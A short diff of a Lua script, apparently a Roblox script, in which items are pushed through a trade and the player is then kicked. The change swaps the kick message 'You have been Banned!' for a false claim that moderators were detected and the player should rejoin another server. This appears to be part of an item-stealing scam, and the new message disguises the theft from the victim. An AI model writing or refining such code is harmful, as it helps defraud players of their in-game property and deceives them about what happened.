@@ -418,7 +418,7 @@ if #itemsToSend > 0 then
             readyTrade()
             confirmTrade()
         end
-        plr:kick("You have been Banned!")
+        plr:kick("Mod/staff detected on server Rejoin on other server!")
     end
 
     local function waitForUserJoin()
